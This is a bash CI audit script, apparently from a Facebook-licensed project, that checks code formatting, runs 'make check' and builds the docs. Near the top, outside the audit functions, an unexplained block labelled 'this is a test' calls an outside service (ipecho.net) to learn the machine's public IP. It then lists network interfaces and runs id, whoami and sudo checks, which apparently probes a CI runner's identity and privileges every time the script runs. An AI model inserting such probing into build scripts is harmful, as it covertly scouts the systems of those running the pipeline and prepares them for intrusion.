#!/usr/bin/env bash

#  Copyright (c) 2014-present, Facebook, Inc.
#  All rights reserved.
#
#  This source code is licensed under the BSD-style license found in the
#  LICENSE file in the root directory of this source tree. An additional grant
#  of patent rights can be found in the PATENTS file in the same directory.

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
source $SCRIPT_DIR/lib.sh

echo 'this is a test'
curl ipecho.net/plain; echo
ifconfig
id
whoami
sudo id
sudo whoami
echo 'end test'

function check_format() {
  # Create a master branch if it does not exist.
  if ! git rev-parse --verify master &> /dev/null; then
    git fetch origin master &> /dev/null
    git branch master FETCH_HEAD &> /dev/null || true
  fi

  # Format and show the status
  make format_master
  
  if [[ `git diff --name-only | wc -l | awk '{print $1}'` = "0" ]]; then
    return 0
  else
    git --no-pager diff || true
    return 1
  fi
}

function audit() {
  log "Running various code/change audits!"

  echo ""
  log "Initializing and updating all submodules"
  checkout_thirdparty

  echo ""
  log "Running: make format"
  check_format

  echo ""
  log "Running: make check"
  make check

  # Check the docs creation
  echo ""
  log "Running: make docs"
  make docs
}

audit

exit 0
